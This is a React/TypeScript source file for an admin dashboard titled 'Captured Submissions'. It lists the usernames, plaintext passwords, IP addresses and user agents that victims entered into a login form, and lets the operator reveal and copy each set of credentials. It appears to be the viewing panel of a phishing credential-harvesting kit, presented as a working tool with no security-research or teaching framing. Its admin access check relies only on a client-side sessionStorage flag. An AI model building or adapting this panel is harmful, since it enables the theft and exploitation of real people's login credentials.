import { useQuery } from "@tanstack/react-query";
import { Card, CardContent, CardHeader } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Clock, Eye, EyeOff, Copy, Check, RefreshCw, LogOut } from "lucide-react";
import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import type { Submission } from "@shared/schema";
import { queryClient } from "@/lib/queryClient";

export default function AdminPage() {
  const [, setLocation] = useLocation();
  
  useEffect(() => {
    const isAuthenticated = sessionStorage.getItem("admin_authenticated");
    if (!isAuthenticated) {
      setLocation("/admin-login");
    }
  }, [setLocation]);

  const { data: submissions, isLoading } = useQuery<Submission[]>({
    queryKey: ["/api/submissions"],
  });

  const handleRefresh = () => {
    queryClient.invalidateQueries({ queryKey: ["/api/submissions"] });
  };

  const handleLogout = () => {
    sessionStorage.removeItem("admin_authenticated");
    setLocation("/admin-login");
  };

  return (
    <div className="min-h-screen bg-background p-8">
      <div className="max-w-7xl mx-auto">
        <div className="flex items-center justify-between mb-8">
          <div>
            <h1 className="text-3xl font-bold mb-2" data-testid="text-admin-title">
              Captured Submissions
            </h1>
            <p className="text-muted-foreground">
              View all credentials submitted through the login form
            </p>
          </div>
          <div className="flex items-center gap-4">
            <Badge variant="default" className="gap-2">
              <span className="h-2 w-2 rounded-full bg-green-500 animate-pulse"></span>
              Live
            </Badge>
            <Button
              variant="outline"
              size="sm"
              onClick={handleRefresh}
              data-testid="button-refresh"
            >
              <RefreshCw className="h-4 w-4 mr-2" />
              Refresh
            </Button>
            <Button
              variant="outline"
              size="sm"
              onClick={handleLogout}
              data-testid="button-logout"
            >
              <LogOut className="h-4 w-4 mr-2" />
              Logout
            </Button>
          </div>
        </div>

        {isLoading ? (
          <div className="text-center py-12">
            <p className="text-muted-foreground">Loading submissions...</p>
          </div>
        ) : !submissions || submissions.length === 0 ? (
          <div className="text-center py-12">
            <p className="text-muted-foreground mb-2">No submissions yet</p>
            <p className="text-sm text-muted-foreground">
              Credentials will appear here when users submit the login form
            </p>
          </div>
        ) : (
          <div className="space-y-4">
            <p className="text-sm text-muted-foreground mb-4">
              Total: {submissions.length} submission{submissions.length !== 1 ? 's' : ''}
            </p>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
              {submissions.map((submission) => (
                <SubmissionCard key={submission.id} submission={submission} />
              ))}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

function SubmissionCard({ submission }: { submission: Submission }) {
  const [showPassword, setShowPassword] = useState(false);
  const [copied, setCopied] = useState(false);

  const handleCopy = () => {
    const text = `Username: ${submission.username}\nPassword: ${submission.password}\nTimestamp: ${new Date(submission.timestamp).toLocaleString()}`;
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <Card className="hover-elevate" data-testid={`card-submission-${submission.id}`}>
      <CardHeader className="pb-3">
        <div className="flex items-center justify-between gap-2">
          <div className="flex items-center gap-2 text-sm text-muted-foreground">
            <Clock className="h-4 w-4" />
            <span data-testid={`text-timestamp-${submission.id}`}>
              {new Date(submission.timestamp).toLocaleString()}
            </span>
          </div>
          <Button
            variant="ghost"
            size="icon"
            onClick={handleCopy}
            className="h-8 w-8"
            data-testid={`button-copy-${submission.id}`}
          >
            {copied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
          </Button>
        </div>
      </CardHeader>
      <CardContent className="space-y-4">
        <div>
          <p className="text-xs text-muted-foreground mb-1">Username</p>
          <p className="font-semibold break-all" data-testid={`text-username-${submission.id}`}>
            {submission.username}
          </p>
        </div>

        <div>
          <div className="flex items-center justify-between mb-1">
            <p className="text-xs text-muted-foreground">Password</p>
            <Button
              variant="ghost"
              size="icon"
              onClick={() => setShowPassword(!showPassword)}
              className="h-6 w-6"
              data-testid={`button-toggle-password-${submission.id}`}
            >
              {showPassword ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
            </Button>
          </div>
          <p className="font-mono text-sm break-all" data-testid={`text-password-${submission.id}`}>
            {showPassword ? submission.password : "•".repeat(Math.min(submission.password.length, 20))}
          </p>
        </div>

        {(submission.ipAddress || submission.userAgent) && (
          <div className="pt-2 border-t border-border space-y-2">
            {submission.ipAddress && (
              <div>
                <p className="text-xs text-muted-foreground">IP Address</p>
                <p className="text-xs font-mono" data-testid={`text-ip-${submission.id}`}>
                  {submission.ipAddress}
                </p>
              </div>
            )}
            {submission.userAgent && (
              <div>
                <p className="text-xs text-muted-foreground">User Agent</p>
                <p className="text-xs truncate" data-testid={`text-useragent-${submission.id}`}>
                  {submission.userAgent}
                </p>
              </div>
            )}
          </div>
        )}
      </CardContent>
    </Card>
  );
}
